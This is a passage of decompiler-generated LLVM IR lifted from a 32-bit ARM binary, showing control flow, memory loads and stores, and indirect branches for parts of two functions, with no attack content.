  store i32 %v1_ea98, i32* %r0.global-to-local, align 4
  %v2_ea9c = icmp eq i8 %v3_ea98, 0
  br i1 %v2_ea9c, label %dec_label_pc_eaa4, label %dec_label_pc_ea14

dec_label_pc_eaa4:                                ; preds = %dec_label_pc_ea98, %dec_label_pc_ea58
  %v0_eab0 = phi i32 [ %v0_eab0.pre, %dec_label_pc_ea58 ], [ %v0_e9f8, %dec_label_pc_ea98 ]
  %v0_eaac = phi i32 [ %v1_ea80, %dec_label_pc_ea58 ], [ %v3_ea04, %dec_label_pc_ea98 ]
  %v0_eaa4 = load i32, i32* @r4, align 4
  %v1_eaa4 = and i32 %v0_eaa4, 4
  %v1_eaa8 = and i32 %v0_eaa4, -5
  store i32 %v1_eaa8, i32* %r3.global-to-local, align 4
  %v1_eaac = and i32 %v0_eaac, 3840
  store i32 %v1_eaac, i32* %r2.global-to-local, align 4
  %v1_eab0 = inttoptr i32 %v0_eab0 to i8*
  %v2_eab0 = load i8, i8* %v1_eab0, align 1
  %v3_eab0 = zext i8 %v2_eab0 to i32
  store i32 %v3_eab0, i32* %r1.global-to-local, align 4
  %v2_eab4 = or i32 %v1_eaa8, %v1_eaac
  store i32 %v2_eab4, i32* %r2.global-to-local, align 4
  %tmp178 = mul nuw nsw i32 %v1_eaa4, 4
  %tmp179 = or i32 %tmp178, 32
  %v1_eac0 = load i32, i32* %r7.global-to-local, align 4
  %v2_eac0 = add i32 %v1_eac0, 20
  %v3_eac0 = inttoptr i32 %v2_eac0 to i32*
  store i32 %tmp179, i32* %v3_eac0, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_eac8 = load i32, i32* %r1.global-to-local, align 4
  %v1_eac8 = load i32, i32* %r7.global-to-local, align 4
  %v2_eac8 = add i32 %v1_eac8, 12
  %v3_eac8 = inttoptr i32 %v2_eac8 to i32*
  store i32 %v0_eac8, i32* %v3_eac8, align 4
  %v0_eacc = load i32, i32* %r7.global-to-local, align 4
  %v1_eacc = add i32 %v0_eacc, 4
  %v2_eacc = inttoptr i32 %v1_eacc to i32*
  %v3_eacc = load i32, i32* @r5, align 4
  store i32 %v3_eacc, i32* %v2_eacc, align 4
  %v4_eacc = add i32 %v0_eacc, 8
  %v5_eacc = inttoptr i32 %v4_eacc to i32*
  %v6_eacc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_eacc, i32* %v5_eacc, align 4
  %v0_ead0 = load i32, i32* %r2.global-to-local, align 4
  %v1_ead0 = load i32, i32* %r7.global-to-local, align 4
  %v2_ead0 = add i32 %v1_ead0, 16
  %v3_ead0 = inttoptr i32 %v2_ead0 to i32*
  store i32 %v0_ead0, i32* %v3_ead0, align 4
  %v0_ead4 = load i32, i32* %r3.global-to-local, align 4
  %v1_ead4 = load i32, i32* %r7.global-to-local, align 4
  %v2_ead4 = add i32 %v1_ead4, 28
  %v3_ead4 = inttoptr i32 %v2_ead4 to i32*
  store i32 %v0_ead4, i32* %v3_ead4, align 4
  %v0_ead8 = load i32, i32* %r0.global-to-local, align 4
  %v1_ead8 = inttoptr i32 %v0_ead8 to i8*
  %v2_ead8 = load i8, i8* %v1_ead8, align 1
  %v3_ead8 = zext i8 %v2_ead8 to i32
  store i32 %v3_ead8, i32* %r2.global-to-local, align 4
  %v2_eadc = icmp eq i8 %v2_ead8, 0
  br i1 %v2_eadc, label %dec_label_pc_eae4, label %dec_label_pc_eb68

dec_label_pc_eae4:                                ; preds = %dec_label_pc_eaa4
  %v0_eae4 = load i32, i32* %r6.global-to-local, align 4
  %v1_eae4 = inttoptr i32 %v0_eae4 to i8*
  %v2_eae4 = load i8, i8* %v1_eae4, align 1
  %v3_eae4 = zext i8 %v2_eae4 to i32
  store i32 %v3_eae4, i32* %r3.global-to-local, align 4
  %v7_eae8 = icmp eq i8 %v2_eae4, 109
  br i1 %v7_eae8, label %.thread27, label %dec_label_pc_eafc

.thread27:                                        ; preds = %dec_label_pc_eae4
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_eaf0 = load i32, i32* %r7.global-to-local, align 4
  %v3_eaf0 = add i32 %v2_eaf0, 32
  %v4_eaf0 = inttoptr i32 %v3_eaf0 to i32*
  store i32 20, i32* %v4_eaf0, align 4
  %v1_eaf4 = load i32, i32* %r2.global-to-local, align 4
  %v2_eaf4 = load i32, i32* %r7.global-to-local, align 4
  %v3_eaf4 = add i32 %v2_eaf4, 28
  %v4_eaf4 = inttoptr i32 %v3_eaf4 to i32*
  store i32 %v1_eaf4, i32* %v4_eaf4, align 4
  br label %dec_label_pc_eb68

dec_label_pc_eafc:                                ; preds = %dec_label_pc_eae4
  store i32 656, i32* %r3.global-to-local, align 4
  %v0_eb00 = load i32, i32* @lr, align 4
  %v2_eb00 = add i32 %v0_eb00, 656
  %v3_eb00 = inttoptr i32 %v2_eb00 to i32*
  %v4_eb00 = load i32, i32* %v3_eb00, align 4
  store i32 %v4_eb00, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_eb08 = load i32, i32* %r7.global-to-local, align 4
  %v2_eb08 = add i32 %v1_eb08, 32
  %v3_eb08 = inttoptr i32 %v2_eb08 to i32*
  store i32 21, i32* %v3_eb08, align 4
  %v0_eb0c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_eb0c, i32* @ip, align 4
  %v1_eb10 = add i32 %v0_eb0c, 10
  store i32 %v1_eb10, i32* %r0.global-to-local, align 4
  %v0_eb18.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_eb18 = inttoptr i32 %v0_eb18.pre to i8*
  br label %dec_label_pc_eb14

dec_label_pc_eb14:                                ; preds = %dec_label_pc_eb58, %dec_label_pc_eafc
  %v1_eb24 = phi i32 [ %v1_eb58, %dec_label_pc_eb58 ], [ %v0_eb0c, %dec_label_pc_eafc ]
  %v1_eb14 = inttoptr i32 %v1_eb24 to i8*
  %v2_eb14 = load i8, i8* %v1_eb14, align 1
  %v3_eb14 = zext i8 %v2_eb14 to i32
  store i32 %v3_eb14, i32* %r2.global-to-local, align 4
  %v2_eb18 = load i8, i8* %v1_eb18, align 1
  %v3_eb18 = zext i8 %v2_eb18 to i32
  store i32 %v3_eb18, i32* %r3.global-to-local, align 4
  %v9_eb1c = icmp eq i8 %v2_eb14, %v2_eb18
  br i1 %v9_eb1c, label %dec_label_pc_eb24, label %dec_label_pc_eb58

dec_label_pc_eb24:                                ; preds = %dec_label_pc_eb14
  %v2_eb24 = sub i32 %v1_eb24, %v0_eb0c
  store i32 %v2_eb24, i32* %r3.global-to-local, align 4
  %v0_eb2c = load i32, i32* %r7.global-to-local, align 4
  %v1_eb2c = add i32 %v0_eb2c, 4
  store i32 %v1_eb2c, i32* %r0.global-to-local, align 4
  %v0_eb30 = load i32, i32* @lr, align 4
  %v2_eb30 = add i32 %v0_eb30, 11332
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_eb38 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_eb38, i32* %r2.global-to-local, align 4
  %v4_eb3c = mul i32 %v2_eb24, 4
  %v5_eb3c = add i32 %v2_eb30, %v4_eb3c
  %v6_eb3c = inttoptr i32 %v5_eb3c to i32*
  %v7_eb3c = load i32, i32* %v6_eb3c, align 4
  store i32 %v7_eb3c, i32* @ip, align 4
  store i32 60232, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_eb3c)
  %v0_eb48 = load i32, i32* %r0.global-to-local, align 4
  %v1_eb4c = load i32, i32* %r7.global-to-local, align 4
  %v2_eb4c = add i32 %v1_eb4c, 28
  %v3_eb4c = inttoptr i32 %v2_eb4c to i32*
  store i32 %v0_eb48, i32* %v3_eb4c, align 4
  %v7_eb50 = icmp sgt i32 %v0_eb48, 5
  br i1 %v7_eb50, label %dec_label_pc_ec64, label %dec_label_pc_eb68

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb14
  %v1_eb58 = add i32 %v1_eb24, 1
  store i32 %v1_eb58, i32* %r1.global-to-local, align 4
  %v3_eb5c = icmp ult i32 %v1_eb58, %v1_eb10
  br i1 %v3_eb5c, label %dec_label_pc_eb14, label %dec_label_pc_ec64

dec_label_pc_eb68:                                ; preds = %.thread27, %dec_label_pc_eb24, %dec_label_pc_eaa4
  %v0_eb68 = load i32, i32* %fp.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_eb68, 1
  br i1 %tmp154, label %dec_label_pc_ec14, label %dec_label_pc_eb70

dec_label_pc_eb70:                                ; preds = %dec_label_pc_eb68
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_eb88 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_eb74

dec_label_pc_eb74:                                ; preds = %dec_label_pc_ebfc, %dec_label_pc_eb70
  %v9_eb94 = phi i32 [ 0, %dec_label_pc_eb70 ], [ %v1_ec00, %dec_label_pc_ebfc ]
  %v7_eb78 = icmp sgt i32 %v9_eb94, 2
  br i1 %v7_eb78, label %.thread37, label %bb155

.thread37:                                        ; preds = %dec_label_pc_eb74
  store i32 %v9_eb88, i32* %r3.global-to-local, align 4
  %v10_eb94 = add i32 %v9_eb94, %v9_eb88
  store i32 %v10_eb94, i32* %r1.global-to-local, align 4
  br label %bb156

bb155:                                            ; preds = %dec_label_pc_eb74
  store i32 %v3_e7f0.pre-phi, i32* @ip, align 4
  %v12_eb7c = mul i32 %v9_eb94, 4
  %v13_eb7c = add i32 %v12_eb7c, %v3_e7f0.pre-phi
  store i32 %v13_eb7c, i32* %r3.global-to-local, align 4
  %v9_eb84 = add i32 %v13_eb7c, -12
  %v10_eb84 = inttoptr i32 %v9_eb84 to i8*
  %v11_eb84 = load i8, i8* %v10_eb84, align 4
  %v12_eb84 = zext i8 %v11_eb84 to i32
  store i32 %v12_eb84, i32* %r2.global-to-local, align 4
  %v9_eb8c = load i32, i32* %r7.global-to-local, align 4
  %v10_eb8c = add i32 %v9_eb8c, %v9_eb94
  store i32 %v10_eb8c, i32* %r3.global-to-local, align 4
  store i32 %v12_eb84, i32* %r1.global-to-local, align 4
  %v11_eb98 = add i32 %v10_eb8c, 36
  %v12_eb98 = inttoptr i32 %v11_eb98 to i8*
  store i8 %v11_eb84, i8* %v12_eb98, align 1
  %v0_eb9c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %.thread37, %bb155
  %v0_ebbc = phi i32 [ %v10_eb94, %.thread37 ], [ %v0_eb9c.pre, %bb155 ]
  %v1_eb9c = load i32, i32* %fp.global-to-local, align 4
  %v2_eb9c = sub i32 %v0_ebbc, %v1_eb9c
  %v4_eb9c = xor i32 %v1_eb9c, %v0_ebbc
  %v5_eb9c = xor i32 %v2_eb9c, %v0_ebbc
  %v6_eb9c = and i32 %v5_eb9c, %v4_eb9c
  %v7_eb9c = icmp slt i32 %v6_eb9c, 0
  %v8_eb9c = icmp slt i32 %v2_eb9c, 0
  %v9_eb9c = icmp eq i32 %v0_ebbc, %v1_eb9c
  %v3_eba0 = xor i1 %v8_eb9c, %v7_eb9c
  %v4_eba0 = or i1 %v9_eb9c, %v3_eba0
  br i1 %v4_eba0, label %dec_label_pc_ebb0, label %dec_label_pc_eba4

dec_label_pc_eba4:                                ; preds = %bb156
  %v1_eba4 = add i32 %v0_ebbc, -9
  %v3_eba4 = sub i32 8, %v0_ebbc
  %v4_eba4 = and i32 %v3_eba4, %v0_ebbc
  %v5_eba4 = icmp slt i32 %v4_eba4, 0
  %v6_eba4 = icmp slt i32 %v1_eba4, 0
  %v7_eba4 = icmp eq i32 %v0_ebbc, 9
  %v3_eba8 = xor i1 %v6_eba4, %v5_eba4
  %v4_eba8 = or i1 %v7_eba4, %v3_eba8
  br i1 %v4_eba8, label %dec_label_pc_ebac, label %dec_label_pc_ec64

dec_label_pc_ebac:                                ; preds = %dec_label_pc_eba4
  store i32 %v0_ebbc, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_ebb0

dec_label_pc_ebb0:                                ; preds = %bb156, %dec_label_pc_ebac
  store i32 %v3_e7f0.pre-phi, i32* @r2, align 4
  %v1_ebb4 = load i32, i32* %r8.global-to-local, align 4
  %v4_ebb4 = mul i32 %v1_ebb4, 4
  %v5_ebb4 = add i32 %v4_ebb4, %v3_e7f0.pre-phi
  store i32 %v5_ebb4, i32* %sb.global-to-local, align 4
  %v1_ebb8 = add i32 %v5_ebb4, -40
  %v2_ebb8 = inttoptr i32 %v1_ebb8 to i32*
  %v3_ebb8 = load i32, i32* %v2_ebb8, align 4
  store i32 %v3_ebb8, i32* %r5.global-to-local, align 4
  %v1_ebbc = add i32 %v0_ebbc, -1
  store i32 %v1_ebbc, i32* %r3.global-to-local, align 4
  %v0_ebc0 = load i32, i32* %r7.global-to-local, align 4
  %v4_ebc0 = mul i32 %v1_ebbc, 4
  %v5_ebc0 = add i32 %v0_ebc0, %v4_ebc0
  store i32 %v5_ebc0, i32* %sl.global-to-local, align 4
  %v7_ebc4 = icmp eq i32 %v3_ebb8, 8
  %v1_ebc8 = add i32 %v5_ebc0, 40
  %v2_ebc8 = inttoptr i32 %v1_ebc8 to i32*
  %v3_ebc8 = load i32, i32* %v2_ebc8, align 4
  store i32 %v3_ebc8, i32* @r0, align 4
  br i1 %v7_ebc4, label %dec_label_pc_ebfc, label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_ebb0
  %v9_ebd0 = icmp eq i32 %v3_ebc8, %v3_ebb8
  br i1 %v9_ebd0, label %dec_label_pc_ebf4, label %bb157

bb157:                                            ; preds = %dec_label_pc_ebd0
  %v8_ebd4 = icmp eq i32 %v3_ebc8, 8
  br i1 %v8_ebd4, label %dec_label_pc_ebf4, label %dec_label_pc_ebdc

dec_label_pc_ebdc:                                ; preds = %bb157
  %v0_ebdc = call i32 @function_e6e0()
  %v0_ebe4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ebe4, i32* @r0, align 4
  %v0_ebe8 = call i32 @function_e6e0()
  store i32 %v0_ebe8, i32* %r0.global-to-local, align 4
  %v8_ebf0 = icmp sgt i32 %v0_ebdc, %v0_ebe8
  br i1 %v8_ebf0, label %dec_label_pc_ebfc, label %dec_label_pc_ebdc.dec_label_pc_ebf4_crit_edge

dec_label_pc_ebdc.dec_label_pc_ebf4_crit_edge:    ; preds = %dec_label_pc_ebdc
  %v0_ebf4.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_ebf8.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebdc.dec_label_pc_ebf4_crit_edge, %dec_label_pc_ebd0, %bb157
  %v1_ebf8 = phi i32 [ %v1_ebf8.pre, %dec_label_pc_ebdc.dec_label_pc_ebf4_crit_edge ], [ %v5_ebc0, %dec_label_pc_ebd0 ], [ %v5_ebc0, %bb157 ]
  %v0_ebf4 = phi i32 [ %v0_ebf4.pre, %dec_label_pc_ebdc.dec_label_pc_ebf4_crit_edge ], [ %v5_ebb4, %dec_label_pc_ebd0 ], [ %v5_ebb4, %bb157 ]
  %v1_ebf4 = add i32 %v0_ebf4, -40
  %v2_ebf4 = inttoptr i32 %v1_ebf4 to i32*
  %v3_ebf4 = load i32, i32* %v2_ebf4, align 4
  store i32 %v3_ebf4, i32* %r3.global-to-local, align 4
  %v2_ebf8 = add i32 %v1_ebf8, 40
  %v3_ebf8 = inttoptr i32 %v2_ebf8 to i32*
  store i32 %v3_ebf4, i32* %v3_ebf8, align 4
  br label %dec_label_pc_ebfc

dec_label_pc_ebfc:                                ; preds = %dec_label_pc_ebdc, %dec_label_pc_ebb0, %dec_label_pc_ebf4
  %v0_ebfc = load i32, i32* %r7.global-to-local, align 4
  %v1_ebfc = add i32 %v0_ebfc, 28
  %v2_ebfc = inttoptr i32 %v1_ebfc to i32*
  %v3_ebfc = load i32, i32* %v2_ebfc, align 4
  %v0_ec00 = load i32, i32* %r8.global-to-local, align 4
  %v1_ec00 = add i32 %v0_ec00, 1
  store i32 %v1_ec00, i32* %r8.global-to-local, align 4
  %v1_ec04 = add i32 %v3_ebfc, 2
  store i32 %v1_ec04, i32* %r3.global-to-local, align 4
  %v6_ec0c = icmp slt i32 %v1_ec00, %v1_ec04
  br i1 %v6_ec0c, label %dec_label_pc_eb74, label %dec_label_pc_ec30

dec_label_pc_ec14:                                ; preds = %dec_label_pc_eb68
  %v0_ec14 = load i32, i32* %r7.global-to-local, align 4
  %v1_ec14 = add i32 %v0_ec14, 28
  %v2_ec14 = inttoptr i32 %v1_ec14 to i32*
  %v3_ec14 = load i32, i32* %v2_ec14, align 4
  store i32 %v3_ec14, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_ec1c = add i32 %v0_ec14, 38
  %v4_ec1c = inttoptr i32 %v3_ec1c to i8*
  store i8 1, i8* %v4_ec1c, align 1
  %v0_ec20 = load i32, i32* %r2.global-to-local, align 4
  %v3_ec20 = mul i32 %v0_ec20, 4
  store i32 %v3_ec20, i32* @r2, align 4
  %v0_ec24 = load i32, i32* %r7.global-to-local, align 4
  %v1_ec24 = add i32 %v0_ec24, 40
  store i32 %v1_ec24, i32* @r0, align 4
  %v2_ec28 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_ec28, i32* @r1, align 4
  %v0_ec2c = call i32 @function_f700()
  store i32 %v0_ec2c, i32* %r0.global-to-local, align 4
  %v0_ec30.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_ec30

dec_label_pc_ec30:                                ; preds = %dec_label_pc_ebfc, %dec_label_pc_ec14
  %v2_ec4c = phi i32 [ %v0_ec30.pre, %dec_label_pc_ec14 ], [ %v0_ebfc, %dec_label_pc_ebfc ]
  %v1_ec30 = add i32 %v2_ec4c, 16
  %v2_ec30 = inttoptr i32 %v1_ec30 to i32*
  %v3_ec30 = load i32, i32* %v2_ec30, align 4
  store i32 %v3_ec30, i32* %r3.global-to-local, align 4
  %v1_ec34 = and i32 %v3_ec30, 128
  %v2_ec34 = icmp eq i32 %v1_ec34, 0
  br i1 %v2_ec34, label %.thread49, label %.thread47

.thread47:                                        ; preds = %dec_label_pc_ec30
  %v3_ec38 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_ec38, i32* %r3.global-to-local, align 4
  %v2_ec3c = inttoptr i32 %v2_ec4c to i32*
  %v3_ec3c = load i32, i32* %v2_ec3c, align 4
  %v2_ec44.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_ec44 = sub i32 %v2_ec44.pre, %v3_ec38
  store i32 %v3_ec44, i32* %r3.global-to-local, align 4
  %v5_ec48 = mul i32 %v3_ec44, 4
  %v6_ec48 = add i32 %v5_ec48, %v3_ec3c
  store i32 %v6_ec48, i32* @r2, align 4
  br label %bb158

.thread49:                                        ; preds = %dec_label_pc_ec30
  %v1_ec4044 = load i32, i32* %r6.global-to-local, align 4
  %v2_ec4045 = add i32 %v1_ec4044, 1
  store i32 %v2_ec4045, i32* %r3.global-to-local, align 4
  %v3_ec4c = inttoptr i32 %v2_ec4c to i32*
  store i32 %v2_ec4045, i32* %v3_ec4c, align 4
  %v0_ec50.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread47, %.thread49
  %v1_ec58 = phi i32 [ %v2_ec4c, %.thread47 ], [ %v0_ec50.pre, %.thread49 ]
  %v1_ec50 = add i32 %v1_ec58, 28
  %v2_ec50 = inttoptr i32 %v1_ec50 to i32*
  %v3_ec50 = load i32, i32* %v2_ec50, align 4
  store i32 %v3_ec50, i32* %r3.global-to-local, align 4
  %v1_ec54 = add i32 %v3_ec50, 2
  store i32 %v1_ec54, i32* %r0.global-to-local, align 4
  %v0_ec58 = load i32, i32* %fp.global-to-local, align 4
  %v2_ec58 = add i32 %v1_ec58, 24
  %v3_ec58 = inttoptr i32 %v2_ec58 to i32*
  store i32 %v0_ec58, i32* %v3_ec58, align 4
  br i1 %v2_ec34, label %dec_label_pc_ec68, label %bb159

bb159:                                            ; preds = %bb158
  %v1_ec5c = load i32, i32* @r2, align 4
  %v2_ec5c = load i32, i32* %r7.global-to-local, align 4
  %v3_ec5c = inttoptr i32 %v2_ec5c to i32*
  store i32 %v1_ec5c, i32* %v3_ec5c, align 4
  br label %dec_label_pc_ec68

dec_label_pc_ec64:                                ; preds = %dec_label_pc_eb58, %dec_label_pc_e778, %dec_label_pc_e8c0, %dec_label_pc_e96c, %dec_label_pc_e944, %dec_label_pc_e950, %dec_label_pc_e88c, %dec_label_pc_eba4, %dec_label_pc_eb24, %.thread23
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %bb159, %bb158, %dec_label_pc_ec64
  %v2_ec6c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ec6c, i32* @r4, align 4
  store i32 %v6_e734, i32* @r5, align 4
  store i32 %v27_e734, i32* @lr, align 4
  %v1_ec70 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_ec70

; uselistorder directives
  uselistorder i32 %v3_ec44, { 1, 0 }
  uselistorder i32 %v1_ec00, { 1, 2, 0 }
  uselistorder i32 %v2_eb9c, { 1, 0 }
  uselistorder i32 %v1_eb9c, { 1, 0, 2 }
  uselistorder i32 %v0_ebbc, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_eb94, { 0, 2, 1, 3 }
  uselistorder i32 %v1_eb58, { 1, 2, 0 }
  uselistorder i32 %v0_eb48, { 1, 0 }
  uselistorder i32 %v1_eb24, { 1, 0, 2 }
  uselistorder i32 %v1_ea98, { 1, 2, 0 }
  uselistorder i32 %v1_ea80, { 1, 0 }
  uselistorder i32 %v2_ea68, { 2, 1, 0 }
  uselistorder i32 %v1_ea4c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_ea28, { 1, 0, 2 }
  uselistorder i32 %v3_ea04, { 2, 1, 0 }
  uselistorder i32 %v1_e9c4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_e9b4.pre, { 0, 2, 1 }
  uselistorder i32 %v2_e990, { 1, 0 }
  uselistorder i32 %v5_e8f0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e8f0, { 1, 0 }
  uselistorder i32 %v0_e8f474, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_e898, { 1, 0 }
  uselistorder i32 %v0_e8b8, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_e87c, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_e864, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_e854, { 1, 0 }
  uselistorder i32 %v3_e84c, { 0, 2, 1 }
  uselistorder i8 %v2_e84c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e8cc, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_e810, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_e7fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_e7e4, { 1, 0 }
  uselistorder i32 %v3_e7f0.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_e798, { 0, 2, 1 }
  uselistorder i32 %v2_e784, { 1, 0, 2 }
  uselistorder i32 %v0_e738, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 19, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 20 }
  uselistorder i32* %r6.global-to-local, { 9, 14, 8, 10, 13, 0, 1, 12, 2, 11, 3, 4, 5, 6, 15, 16, 7 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 58, 49, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 17, 44, 47, 48, 45, 46, 50, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 26, 27, 25, 17, 28, 18, 19, 20, 29, 21, 30, 31, 22, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @function_e6e0, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_19b38.343 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_19ad4.341 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0 }
  uselistorder i32 -72, { 1, 0 }
  uselistorder label %dec_label_pc_ec68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ec64, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_ec30, { 1, 0 }
  uselistorder label %dec_label_pc_ebfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ebf4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_ebb0, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_eb68, { 1, 0, 2 }
  uselistorder label %bb150, { 2, 1, 0 }
  uselistorder label %.thread23, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e97c, { 1, 0 }
  uselistorder label %dec_label_pc_e930, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e8ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e8a8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e848, { 1, 0 }
  uselistorder label %dec_label_pc_e844, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e848.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e7e8, { 1, 0 }
  uselistorder label %dec_label_pc_e7bc, { 1, 0 }
}

define i32 @function_eca4(i16* %arg1) local_unnamed_addr {
dec_label_pc_eca4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_eca4 = load i32, i32* @r4, align 4
  store i32 %v3_eca4, i32* %stack_var_-20, align 4
  %v2_eca8 = add i32 %tmp, 52
  %v3_eca8 = inttoptr i32 %v2_eca8 to i32*
  %v4_eca8 = load i32, i32* %v3_eca8, align 4
  store i32 82344, i32* %r5.global-to-local, align 4
  %v1_ecb0 = sub i32 1, %v4_eca8
  %v2_ecb0 = icmp ult i32 %v4_eca8, 2
  br i1 %v2_ecb0, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_eca4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_eca4, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_ecb0, %dec_label_pc_eca4 ]
  %v0_ecb8 = phi i32 [ 0, %bb ], [ %v1_ecb0, %dec_label_pc_eca4 ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_ecb8 = icmp eq i32 %v0_ecb8, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 142964, i32* %r5.global-to-local, align 4
  br i1 %v2_ecb8, label %dec_label_pc_ed04, label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %bb14
  %v2_ecd0 = add i32 %tmp, 56
  store i32 %v2_ecd0, i32* %r4.global-to-local, align 4
  %v4_ece4 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_ece4)
  %v0_ecf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_ecf8 = add i32 %v0_ecf8, 16
  %v3_ecf8 = inttoptr i32 %v2_ecf8 to i32*
  %v4_ecf8 = load i32, i32* %v3_ecf8, align 4
  store i32 %v4_ecf8, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_ecf8)
  %v0_ed04.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_ed08.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_ed04.pre, 0
  br label %dec_label_pc_ed04

dec_label_pc_ed04:                                ; preds = %bb14, %dec_label_pc_eccc
  %v0_ed08 = phi i32 [ %tmp, %bb14 ], [ %v0_ed08.pre, %dec_label_pc_eccc ]
  %v0_ed04 = phi i1 [ true, %bb14 ], [ %phitmp, %dec_label_pc_eccc ]
  %v1_ed08 = inttoptr i32 %v0_ed08 to i16*
  %v2_ed08 = load i16, i16* %v1_ed08, align 2
  %v3_ed08 = zext i16 %v2_ed08 to i32
  store i32 %v3_ed08, i32* %r4.global-to-local, align 4
